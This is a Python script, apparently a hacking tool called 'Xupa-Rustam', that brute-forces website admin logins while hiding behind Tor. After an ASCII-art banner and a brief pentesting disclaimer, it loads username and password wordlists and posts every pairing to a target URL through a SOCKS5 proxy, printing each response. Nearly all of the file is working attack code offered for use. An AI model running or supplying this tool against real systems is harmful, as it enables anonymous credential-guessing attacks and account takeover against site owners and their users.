import requests
import time
import socks
import socket
import os
import sys
from bs4 import BeautifulSoup
#ansi color vars
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
def s_print(text, speed=0.001):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
def intro():
     os.system('clear')
     s_print(f'''{RED}
                                            ¶                ¶
                                           ¶¶                ¶¶
                                         ¶¶¶                  ¶¶¶
                                       ¶¶¶¶                    ¶¶¶¶
                                      ¶¶¶¶¶                    ¶¶¶¶¶
                                     ¶¶¶¶¶                      ¶¶¶¶¶
                                    ¶¶¶¶¶¶                      ¶¶¶¶¶¶
                                    ¶¶¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶¶¶
                                    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                                     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
          
              ██╗░░██╗██╗░░░██╗██████╗░░█████╗░░░░░░░██████╗░██╗░░░██╗░██████╗████████╗░█████╗░███╗░░░███╗
              ╚██╗██╔╝██║░░░██║██╔══██╗██╔══██╗░░░░░░██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██╔══██╗████╗░████║
              ░╚███╔╝░██║░░░██║██████╔╝███████║█████╗██████╔╝██║░░░██║╚█████╗░░░░██║░░░███████║██╔████╔██║
              ░██╔██╗░██║░░░██║██╔═══╝░██╔══██║╚════╝██╔══██╗██║░░░██║░╚═══██╗░░░██║░░░██╔══██║██║╚██╔╝██║
              ██╔╝╚██╗╚██████╔╝██║░░░░░██║░░██║░░░░░░██║░░██║╚██████╔╝██████╔╝░░░██║░░░██║░░██║██║░╚═╝░██║
              ╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝░░╚═╝░░░░░░╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝
                           
                               {RESET}
\n {BLUE}Author: {RESET}{GREEN} Dev. Gautam Kumar (devsdenepal){RESET} \n 
{BLUE} Use: {RESET}{GREEN}Admin. Login Brute Force with Proxy based anonymity.{RESET}\n
({RED}!{RESET}){CYAN}By continuing, you are agree that:{RESET}
 \n This attack is going to be related with Pentesting, development or knowldege gaining and in a controlled environment.
 You are following your federal rules, and in case of any harm caused by this software the software developer wouldn't be responsible.\n
{GREEN} HAPPY H4CK1NG!{RESET}
''')
#      print('''
#            ======
#                ||
#            333333
#                ||
#                ||
#                ||
#              $$$$$$
#            $$      $$
#          $$         $$
#         $$           $$
#          $$         $$
#            $$      $$
#             $$$$$$$$
# ''')
#      time.sleep(0.8)
#      os.system('clear')
#      print('''
#                ======
#                ||
#                333333
#                ||
#                ||
#                ||
#              $$$$$$
#            $$      $$
#          $$         $$
#         $$           $$
#          $$         $$
#            $$      $$
#             $$$$$$$$
# ''')

intro()
# Set up Tor proxy
socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
socket.socket = socks.socksocket

admin_el = []
psd = []
i = 0
a_url = input("Testing URL: ")
# read the list of proxies from the file
uid_param = input('Username or UserId parameter name: ')
#for ex: user_name
password_param = input('Password parameter name: ')
#for ex: user_pass
# read the list of proxies from the file

admin_list_file = input("Admin list path: ")
with open(admin_list_file,'r') as admin_list_file :
    for line in admin_list_file:
        admin_el.append(line.strip())

password_list_file = input("Password list path: ")
with open(password_list_file, 'r') as f:
    psd = [line.strip() for line in f]

for admin in admin_el:
    for password in psd:
        s_print(f"{RESET}{CYAN}Trying: {RESET}{YELLOW}{admin}{RESET}{CYAN} with password {RESET}{YELLOW}{password}{RESET}")
        params = {
                uid_param : admin,
                password_param : password
        }
        try:
            response = requests.post(a_url, params=params, allow_redirects=True)
            if response.status_code == 200:
                s_print(f'\n({RED}!{RESET}) {CYAN} REQUEST-POSTED{RESET}\n{BOLD}({RESET}{RED}*{RESET}{BOLD})The fetched response is: {RESET}{YELLOW}\n')
                print(response.content.decode('utf-8'))
            elif response.status_code in [301, 302]:
                s_print('Redirection detected!\n=== The fetched response is: \n')
                print(response.headers['Location'])
            else:
                 s_print('Error while sending request!\n=== Details of Failure ===\n')
                 print(response.status_code)
        except requests.exceptions.RequestException:
                s_print('Failed to make request')
               # print(requests.exception.RequestException)
        time.sleep(1)
